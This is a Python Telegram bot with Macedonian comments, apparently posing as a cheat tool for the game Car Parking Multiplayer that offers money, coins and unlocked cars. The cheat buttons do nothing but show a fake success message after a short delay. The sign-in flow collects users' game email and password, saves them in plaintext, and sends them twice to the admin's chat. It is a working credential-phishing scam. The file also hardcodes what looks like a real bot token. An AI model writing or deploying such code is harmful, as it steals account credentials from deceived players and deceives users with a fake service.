import logging
import sqlite3
import asyncio
import re
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters
)

# Конфигурирање на логирање
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Точниот токен и ADMIN ID
BOT_TOKEN = "8674559116:AAFuZWJJLVY-qMAHBSr7Z6om686b1zeGxKc" 
ADMIN_ID = 8694942406  

def inicijaliziraj_baza():
    conn = sqlite3.connect('Licenci.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS licenci 
                      (id TEXT PRIMARY KEY, data TEXT, odobren INTEGER DEFAULT 0, email TEXT, password TEXT)''')
    conn.commit()
    conn.close()

inicijaliziraj_baza()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user if update.message else update.callback_query.from_user
    username = user.username if user.username else "User"

    conn = sqlite3.connect('Licenci.db')
    cursor = conn.cursor()
    cursor.execute('SELECT data, odobren FROM licenci WHERE id = ?', (str(user.id),))
    rezultat = cursor.fetchone()
    conn.close()

    sega = datetime.now()
    dozvolen = False

    if rezultat:
        istekuvanje_str = rezultat[0]
        odobren = rezultat[1] if len(rezultat) > 1 else 0
        
        if odobren == 1:
            if istekuvanje_str == "forever":
                dozvolen = True
            else:
                try:
                    dozvolen_sega = datetime.strptime(istekuvanje_str, "%Y-%m-%d %H:%M:%S")
                    if dozvolen_sega > sega:
                        dozvolen = True
                except ValueError:
                    dozvolen = False

    if not dozvolen:
        poraka_lic = "❌ Немате активна лиценца. Барањето е испратено до админот."
        if update.message:
            await update.message.reply_text(poraka_lic)
        elif update.callback_query:
            await update.callback_query.message.reply_text(poraka_lic)
            
        tastatura = [
            [
                InlineKeyboardButton("✅ Засекогаш", callback_data=f"lic:forever:{user.id}"),
                InlineKeyboardButton("📅 30 Дена", callback_data=f"lic:30:{user.id}")
            ],
            [InlineKeyboardButton("❌ Одбиј", callback_data=f"lic:deny:{user.id}")]
        ]
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"⚠️ Барање за лиценца од @{username} (`{user.id}`)\nИзберете опција:",
                reply_markup=InlineKeyboardMarkup(tastatura),
                parse_mode='Markdown'
            )
        except Exception as e:
            print(f"Грешка при праќање до админ: {e}")
        return

    datum_sega = sega.strftime("%d %B %Y")
    welcome_text = (
        "...\n"
        "   **CPM AJHAN BOT v5.0**\n"
        "-------------------------------\n"
        "          **WELCOME**\n"
        f"👤 @{username}\n"
        f"🆔 `{user.id}`\n"
        f"📅 {datum_sega}\n"
        "-------------------------------\n"
        "🗝️ Успешно сте најавени во CPM ботот!"
    )

    keyboard = [[InlineKeyboardButton("📱 Отвори ...", callback_data="open_menu")]]
    
    if update.message:
        await update.message.reply_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    elif update.callback_query:
        await update.callback_query.message.reply_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def main_menu_display(query):
    dashboard_text = (
        "...\n"
        "   **DASHBOARD**\n"
        "-------------------------------\n"
        "       **ACCOUNT**\n"
        "📢 Изберете опција подолу или одете на најава:"
    )
    keyboard = [
        [InlineKeyboardButton("🔑 Најави се во CPM", callback_data="cpm_signin")],
        [InlineKeyboardButton("💰 Money", callback_data="menu_money"), InlineKeyboardButton("🪙 Coins", callback_data="menu_coins")],
        [InlineKeyboardButton("⚡ Features", callback_data="menu_features"), InlineKeyboardButton("🚗 Cars", callback_data="menu_cars")]
    ]
    await query.edit_message_text(text=dashboard_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def grant_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда за администрирање - /grant user_id време"""
    user = update.message.from_user
    
    # Проверка дали е администратор
    if user.id != ADMIN_ID:
        await update.message.reply_text("❌ Немате дозвола за оваа команда!")
        return
    
    # Парсирање на командата
    try:
        args = context.args
        if len(args) < 2:
            await update.message.reply_text("❌ Користете: /grant user_id време (на пр. /grant 123456789 1h)")
            return
        
        target_user_id = int(args[0])
        vreme = args[1]
        
        # Парсирање на времето
        if vreme.endswith('h'):
            hours = int(vreme[:-1])
            vrednost = (datetime.now() + timedelta(hours=hours)).strftime("%Y-%m-%d %H:%M:%S")
            vreme_text = f"{hours} часа"
        elif vreme.endswith('d'):
            days = int(vreme[:-1])
            vrednost = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
            vreme_text = f"{days} дена"
        elif vreme == 'forever':
            vrednost = "forever"
            vreme_text = "засекогаш"
        else:
            await update.message.reply_text("❌ Невалидно време. Користете: 1h, 2d, или forever")
            return
        
        # Ажурирање на базата
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren) VALUES (?, ?, 1)', 
                      (str(target_user_id), vrednost))
        conn.commit()
        conn.close()
        
        # Испраќање порака до корисникот
        try:
            await context.bot.send_message(
                chat_id=target_user_id,
                text=f"✅ Администраторот ви додели лиценца на {vreme_text}! Напишете /start за пристап."
            )
        except Exception as e:
            logger.error(f"Не може да се испрати порака до {target_user_id}: {e}")
        
        await update.message.reply_text(f"✅ Лиценцата е доделена на корисникот {target_user_id} на {vreme_text}")
        
    except ValueError:
        await update.message.reply_text("❌ Невалиден ID. Користете: /grant user_id време")
    except Exception as e:
        await update.message.reply_text(f"❌ Грешка: {str(e)}")

async def obraboti_klikovi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = query.from_user

    if data.startswith("lic:"):
        delovi = data.split(":")
        akcija = delovi[1]
        target_user_id = int(delovi[2])
        
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        
        if akcija == "deny":
            cursor.execute('DELETE FROM licenci WHERE id = ?', (str(target_user_id),))
            poraka = "❌ Вашето барање за лиценца е одбиено."
            admin_odgovor = f"❌ Го одбивте корисникот {target_user_id}"
        else:
            if akcija == "forever":
                vrednost = "forever"
                vreme_text = "засекогаш"
            elif akcija == "30":
                vrednost = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d %H:%M:%S")
                vreme_text = "30 дена"
            else:
                vrednost = "forever"
                vreme_text = "засекогаш"
            
            cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren) VALUES (?, ?, 1)', 
                          (str(target_user_id), vrednost))
            poraka = f"✅ Администраторот ја одобри вашата лиценца на {vreme_text}! Напишете /start за пристап."
            admin_odgovor = f"✅ Одобрена лиценца ({akcija}) за {target_user_id}"
        
        conn.commit()
        conn.close()
        
        try:
            await context.bot.send_message(chat_id=target_user_id, text=poraka)
            await query.edit_message_text(text=admin_odgovor)
        except Exception as e:
            logger.error(f"Грешка при праќање порака: {e}")
        return

    if data == "cpm_signin":
        await query.edit_message_text("📝 Внесете го вашиот CPM Email:")
        context.user_data['sostojba'] = 'CEKA_EMAIL'
        return

    if data == "proveri_status":
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('SELECT odobren FROM licenci WHERE id = ?', (str(user.id),))
        rezultat = cursor.fetchone()
        conn.close()
        
        if rezultat and rezultat[0] == 1:
            await query.edit_message_text("✅ Вашата најава е одобрена! Ве молиме напишете /start за да продолжите.")
            return
        else:
            keyboard = [[InlineKeyboardButton("🔄 Провери статус", callback_data="proveri_status")]]
            await query.edit_message_text(
                "⏳ **Чекање на одобрение**\n"
                "━━━━━━━━━━━━━━━━━━━\n"
                "📧 Вашите податоци се испратени до администраторот.\n"
                "⏱️ Ве молиме почекајте **5-10 минути**.\n"
                "✅ Кликнете на копчето за да проверите дали сте одобрени.\n"
                "━━━━━━━━━━━━━━━━━━━",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
            return

    if data in ["open_menu", "main_menu", "vnes_uspesen"]:
        await main_menu_display(query)
        return

    if data == "menu_money":
        money_text = "...\n   **MONEY**\n-------------------------------\n💵 Max: $50,000,000"
        keyboard = [
            [InlineKeyboardButton("$10M", callback_data="add_10m"), InlineKeyboardButton("$20M", callback_data="add_20m")],
            [InlineKeyboardButton("$50M (MAX)", callback_data="add_50m")],
            [InlineKeyboardButton("⬅️ Назад", callback_data="main_menu")]
        ]
        await query.edit_message_text(text=money_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    if data == "menu_coins":
        coins_text = "...\n   **COINS**\n-------------------------------\n🪙 Max: 500,000"
        keyboard = [
            [InlineKeyboardButton("10k", callback_data="add_10k"), InlineKeyboardButton("50k", callback_data="add_50k")],
            [InlineKeyboardButton("500k (MAX)", callback_data="add_500k")],
            [InlineKeyboardButton("⬅️ Назад", callback_data="main_menu")]
        ]
        await query.edit_message_text(text=coins_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    if data == "menu_features":
        features_text = "...\n   **FEATURES**\n-------------------------------\nИзберете опција:"
        keyboard = [
            [InlineKeyboardButton("🏎️ King Engine", callback_data="add_king")],
            [InlineKeyboardButton("⬅️ Назад", callback_data="main_menu")]
        ]
        await query.edit_message_text(text=features_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    if data == "menu_cars":
        cars_text = "...\n   **CARS**\n-------------------------------\nИзберете возило:"
        keyboard = [
            [InlineKeyboardButton("🚗 Отклучи ги сите коли", callback_data="add_all_cars")],
            [InlineKeyboardButton("⬅️ Назад", callback_data="main_menu")]
        ]
        await query.edit_message_text(text=cars_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    if data.startswith("add_"):
        await query.edit_message_text(text="🔄 Процесирање на барањето...")
        await asyncio.sleep(1.5)
        
        uspesno_text = f"✅ Успешно активирано/додадено: **{data.replace('add_', '')}**"
        keyboard = [[InlineKeyboardButton("👤 Назад во мени", callback_data="main_menu")]]
        await query.message.reply_text(text=uspesno_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

async def obraboti_tekst(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sostojba = context.user_data.get('sostojba')
    vnesen_tekst = update.message.text
    user = update.message.from_user
    username = user.username if user.username else "User"

    if sostojba == 'CEKA_EMAIL':
        # Проверка дали е валиден email
        email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        if not re.match(email_pattern, vnesen_tekst):
            await update.message.reply_text("❌ Внесете валидна email адреса (пример: user@email.com):")
            return
        
        context.user_data['email'] = vnesen_tekst
        await update.message.reply_text("🔒 Сега внесете ја вашата лозинка:")
        context.user_data['sostojba'] = 'CEKA_PASSWORD'
        return

    elif sostojba == 'CEKA_PASSWORD':
        password = vnesen_tekst
        email = context.user_data.get('email')
        context.user_data['sostojba'] = None
        
        # Зачувување во база
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren, email, password) VALUES (?, ?, 0, ?, ?)', 
                      (str(user.id), "pending", email, password))
        conn.commit()
        conn.close()
        
        # ПРАЌАЊЕ НА EMAIL И PASSWORD ДО АДМИНОТ
        admin_poraka = (
            f"🔐 **НОВА НАЈАВА ВО CPM**\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Корисник:** @{username}\n"
            f"🆔 **ID:** `{user.id}`\n"
            f"📧 **Email:** `{email}`\n"
            f"🔑 **Лозинка:** `{password}`\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📅 {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n"
            f"⏳ **Чека на одобрение!**"
        )
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=admin_poraka,
                parse_mode='Markdown'
            )
            logger.info(f"✅ Испратени credentials за @{username} до администратор")
            
            # ИСПРАЌАМЕ И КОПИЈА НА САМИОТ СИБЕ (ЗА СИГУРНОСТ)
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"📝 **Потсетник:** Корисникот @{username} (`{user.id}`) внесе:\n📧 {email}\n🔑 {password}",
                parse_mode='Markdown'
            )
            
        except Exception as e:
            logger.error(f"❌ Грешка при праќање до администратор: {e}")
            await update.message.reply_text("❌ Грешка при праќање на податоците. Обидете се повторно.")
            return
        
        # НА КОРИСНИКОТ МУ СЕ ПОКАЖУВА ПОРАКА ЗА ЧЕКАЊЕ
        cekaj_poraka = (
            "⏳ **Чекање на одобрение**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "📧 Вашите податоци се испратени до администраторот.\n"
            "⏱️ Ве молиме почекајте **5-10 минути**.\n"
            "✅ Кликнете на копчето за да проверите дали сте одобрени.\n"
            "━━━━━━━━━━━━━━━━━━━"
        )
        
        keyboard = [[InlineKeyboardButton("🔄 Провери статус", callback_data="proveri_status")]]
        await update.message.reply_text(
            text=cekaj_poraka,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return
    
    # АКО КОРИСНИКОТ ИСПРАТИ НЕШТО ДРУГО
    else:
        await update.message.reply_text(
            "❌ Ве молиме користете ги копчињата или напишете /start\n"
            "Ако сакате да се најавите, кликнете на 'Најави се во CPM'."
        )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Грешка: {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text("❌ Настана грешка. Обидете се повторно.")

if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Додавање на handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("grant", grant_command))
    app.add_handler(CallbackQueryHandler(obraboti_klikovi))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, obraboti_tekst))
    app.add_error_handler(error_handler)
    
    # Стартување на ботот
    logger.info("🚀 Ботот стартува...")
    app.run_polling()
